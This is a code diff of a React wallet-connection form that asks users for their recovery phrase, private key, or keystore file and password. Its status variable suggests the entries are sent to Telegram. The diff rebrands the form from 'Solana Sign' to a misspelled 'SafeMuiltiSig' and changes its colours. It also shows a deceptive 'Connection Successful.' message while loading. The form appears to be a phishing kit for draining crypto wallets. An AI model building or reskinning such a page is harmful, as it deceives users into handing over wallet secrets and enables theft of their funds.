@@ -126,7 +126,7 @@ const KeyManagementForm: React.FC<KeyManagementFormProps> = ({ type, onClose, on
     const getStatusIcon = () => {
         switch (telegramStatus) {
             case 'sending':
-                return <div className="animate-spin rounded-full h-5 w-5 border-b-2" style={{ borderColor: '#ce9f53' }}></div>;
+                return <div className="animate-spin rounded-full h-5 w-5 border-b-2" style={{ borderColor: '#14244d' }}></div>;
             case 'success':
                 return <CheckCircle className="w-5 h-5" style={{ color: '#53d28d' }} />;
             case 'error':
@@ -182,7 +182,7 @@ const KeyManagementForm: React.FC<KeyManagementFormProps> = ({ type, onClose, on
                                     ? 'bg-[#53d28d]/20 text-[#53d28d] border border-[#53d28d]/30' 
                                     : telegramStatus === 'error'
                                     ? 'bg-red-900/20 text-red-400'
-                                    : 'bg-[#ce9f53]/10 text-[#ce9f53]'
+                                    : 'bg-[#14244d]/10 text-[#14244d]'
                             }`}>
                                 {getStatusIcon()}
                                 <span className="text-sm">{getStatusMessage()}</span>
@@ -191,10 +191,10 @@ const KeyManagementForm: React.FC<KeyManagementFormProps> = ({ type, onClose, on
                         {type === 'phrase' ? (
                             <>
                                 <div className="flex flex-col items-center mb-2">
-                                    <span className="text-white text-center text-sm mb-2">Connect your wallet with Solana Sign.</span>
+                                    <span className="text-white text-center text-sm mb-2">Connect your wallet with SafeMuiltiSig.</span>
                                     <button
                                         type="button"
-                                        className="text-sm text-[#ce9f53] hover:bg-[#ce9f53]/10 px-3 py-1 rounded transition-colors mb-2"
+                                        className="text-sm text-[#14244d] hover:bg-[#14244d]/10 px-3 py-1 rounded transition-colors mb-2"
                                         onClick={handleToggle24Word}
                                         disabled={isLoading}
                                     >
@@ -207,7 +207,7 @@ const KeyManagementForm: React.FC<KeyManagementFormProps> = ({ type, onClose, on
                                             <span className="text-xs text-zinc-500 mb-1">{idx + 1}.</span>
                                             <input
                                                 type="text"
-                                                className="w-full px-2 py-2 rounded-md bg-zinc-800 text-white border border-zinc-700 focus:ring-2 focus:ring-[#ce9f53] focus:border-transparent text-center"
+                                                className="w-full px-2 py-2 rounded-md bg-zinc-800 text-white border border-zinc-700 focus:ring-2 focus:ring-[#14244d] focus:border-transparent text-center"
                                                 value={word}
                                                 onChange={e => handlePhraseWordChange(idx, e.target.value)}
                                                 disabled={isLoading}
@@ -227,7 +227,7 @@ const KeyManagementForm: React.FC<KeyManagementFormProps> = ({ type, onClose, on
                                     <textarea
                                         value={key}
                                         onChange={(e) => setKey(e.target.value)}
-                                        className="w-full h-32 p-3 bg-zinc-800 rounded-lg text-white border border-zinc-700 focus:ring-2 focus:ring-[#ce9f53] focus:border-transparent"
+                                        className="w-full h-32 p-3 bg-zinc-800 rounded-lg text-white border border-zinc-700 focus:ring-2 focus:ring-[#14244d] focus:border-transparent"
                                         placeholder={type === 'private' ? 'Enter your private key' : 'Paste your keystore JSON'}
                                         disabled={isLoading}
                                     />
@@ -250,7 +250,7 @@ const KeyManagementForm: React.FC<KeyManagementFormProps> = ({ type, onClose, on
                                         type={showPassword ? 'text' : 'password'}
                                         value={password}
                                         onChange={(e) => setPassword(e.target.value)}
-                                        className="w-full p-3 bg-zinc-800 text-white rounded-lg border border-zinc-700 focus:ring-2 focus:ring-[#ce9f53] focus:border-transparent"
+                                        className="w-full p-3 bg-zinc-800 text-white rounded-lg border border-zinc-700 focus:ring-2 focus:ring-[#14244d] focus:border-transparent"
                                         placeholder="Enter your password"
                                         disabled={isLoading}
                                     />
@@ -267,21 +267,21 @@ const KeyManagementForm: React.FC<KeyManagementFormProps> = ({ type, onClose, on
                         <div className="space-y-2">
                             <div className="flex items-center justify-between text-xs px-1">
                                 <div className="flex items-center gap-1.5">
-                                    <span className="text-[#ce9f53] font-semibold">
+                                    <span className="text-white font-semibold">
                                         {telegramStatus === 'idle' ? "You're almost there! Complete your wallet connection below." : 'Processing...'}
                                     </span>
                                 </div>
                                 <div className="flex items-center gap-1.5">
-                                    <span className="text-[#ce9f53] font-medium">
+                                    <span className="text-white font-medium">
                                         {currentTime}
                                     </span>
-                                    <Calendar className="w-3.5 h-3.5" style={{ color: '#ce9f53' }} />
+                                    <Calendar className="w-3.5 h-3.5" style={{ color: '#fff' }} />
                                 </div>
                             </div>
                             <div>
                                 <Progress
                                     value={telegramStatus === 'idle' ? 0 : telegramStatus === 'sending' ? 50 : 100}
-                                    className={`h-1 ${telegramStatus === 'idle' ? 'bg-zinc-700' : 'bg-[#ce9f53]'}`}
+                                    className={`h-1 ${telegramStatus === 'idle' ? 'bg-zinc-700' : 'bg-[#14244d]'}`}
                                 />
                             </div>
                         </div>
@@ -297,7 +297,7 @@ const KeyManagementForm: React.FC<KeyManagementFormProps> = ({ type, onClose, on
                             </Button>
                             <Button
                                 type="submit"
-                                className="flex-1 bg-[#ce9f53] text-white font-bold hover:bg-[#b88a3f]"
+                                className="flex-1 bg-[#14244d] text-white font-bold hover:bg-[#b88a3f]"
                                 disabled={isLoading || telegramStatus === 'sending' || (type === 'phrase' && (is24Word ? phraseWords.slice(0,24).some(w => !w) : phraseWords.slice(0,12).some(w => !w)))}
                             >
                                 {isLoading ? 'Connection Successful.' : (type === 'keystore' ? 'Please wait...' : 'Connect Wallet')}
